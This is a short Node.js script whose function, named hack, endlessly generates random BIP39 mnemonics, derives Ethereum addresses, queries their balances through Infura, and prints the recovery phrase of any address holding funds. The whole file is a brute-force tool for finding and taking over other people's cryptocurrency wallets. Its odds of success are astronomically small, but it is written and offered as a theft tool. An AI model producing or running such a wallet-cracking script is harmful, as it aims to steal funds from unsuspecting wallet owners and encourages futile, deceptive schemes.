const eth = require('ethers');
const Web3 = require('web3');
const hdkey = require('ethereumjs-wallet/hdkey');
const bip39 = require('bip39');
const web3 = new Web3('https://mainnet.infura.io/v3/*Your infura key*');

async function hack () {
    let entropy;
    let mnemonicPhrase;
    let hdwallet;
    const path = "m/44'/60'/0'/0/0";
    let wallet;
    let address;
    let balance;
    while(true) {
        entropy = eth.utils.randomBytes(16);
        mnemonicPhrase = eth.utils.entropyToMnemonic(entropy);
        hdwallet = hdkey.fromMasterSeed(bip39.mnemonicToSeedSync(mnemonicPhrase));
        wallet = hdwallet.derivePath(path).getWallet();
        address = `0x${wallet.getAddress().toString('hex')}`;
        balance = await web3.eth.getBalance(address);
        process.stdout.cursorTo(0);
        process.stdout.write(`Checking: ${address}`);
        if(balance > 0) {
            console.log('\n');
            console.log('mnemonic --->>' + ' '+ mnemonicPhrase)
            console.log('balance --->>' + ' '+ balance)
            console.log('\n');
        }
    }
}

hack();
